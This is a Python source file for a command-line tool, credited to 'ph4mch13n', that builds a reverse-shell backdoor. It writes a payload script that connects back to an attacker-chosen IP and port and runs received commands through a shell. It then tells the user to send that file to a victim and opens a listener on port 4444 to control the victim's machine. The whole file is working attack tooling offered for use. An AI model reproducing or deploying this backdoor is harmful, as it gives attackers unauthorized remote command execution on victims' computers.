import socket
import time
import sys
import os 

os.system('cls' if os.name == 'nt' else 'clear')
def banner():
	print('''            
 _____       _             
|  _  |_ _ _| |___ ___ ___ 
|   __| | | . | . | . |  _|
|__|  |_  |___|___|___|_|  
      |___|                ''')
	print("")
	print("Copyright : ph4mch13n")
	print("Twitter : @Anonym0us_VNPC")

banner()

print("")
print("type help")
print("")

host = 'null bytes'
port = 'null bytes'
filename = 'null bytes '

session = True
while session:
	text_main = input("ch13n@backdoor -> ")

	if text_main == "help":
		print("")
		print('''
command                 options
============================================  

set filename            Created File Backdoor

exploit                 run exploit victim

set lhost               set ip victim

set lport               set port victim

options                 show options
''')
		print("")

	elif text_main == "set lhost":
		print("")
		host = input("LHOST : ")
		print("")
		print(f"[*] set lhost : {host}")
		print("[*] next step , set lport")
		print("")

	elif text_main == "set lport":
		print("")
		port = int(input("LPORT : "))
		print("")
		print(f"[*] set lport : {port}")
		print("[*] next step , set file name")
		print("")

	elif text_main == "set filename":
		print("")
		filename = input("File Name : ")
		print("")
		code = f'''
import socket
import subprocess
import time
import os

os.system('cls' if os.name == 'nt' else 'clear')

ip = '{host}'
port = {port}

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.connect((ip, port))

print('[+] Starting Setup Bottom...')
time.sleep(20)
print('[+] Waiting...')

while True:
	s.send(b'whoami')
	s.send(b'pwd')
	cmd = s.recv(1024)
	if cmd == b'exit':
		print("[+] Session Close")
		s.close()
		break

	else:
		proc = subprocess.Popen(cmd, 
			shell=True, 
			stdout=subprocess.PIPE, 
			stderr=subprocess.PIPE, 
			stdin=subprocess.PIPE)

		output = proc.stdout.read() + proc.stderr.read()
		
		s.send(output)
		'''

		with open(f'{filename}.py', 'w') as file:
			file.write(code)

		print(f"[*] set filename {filename}.py")
		print(f"[*] now send to victim this file")
		print("")

	elif text_main == "options":
		print(f'''
LHOST  : {host}
LPORT  : {port}
FILEPATH : {filename}.py
''')

	elif text_main == "exploit":

		import socket
		import sys

		IP = '0.0.0.0'
		PORT = 4444

		s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
		s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
		s.bind((IP, PORT))
		s.listen(1)


		print("")
		print('[+] Starting Service')
		time.sleep(2)
		print('[*] Service On....')
		time.sleep(1)
		print('[*] Server is listening on port '+ str(PORT) + ' ...')
		conn, addr = s.accept()
		print('[+] Connected to ', addr)


		while True:

		      sys.stdout.write("Shell >> ")
		      command = sys.stdin.readline()
		      if command == 'exit\n':
		          print('[+] Close')
		          conn.send(b"exit")
		          conn.close()
		          break  

		      elif command != '\n':
		          conn.send(command.encode())
		          output = conn.recv(1024)
		          print(output)
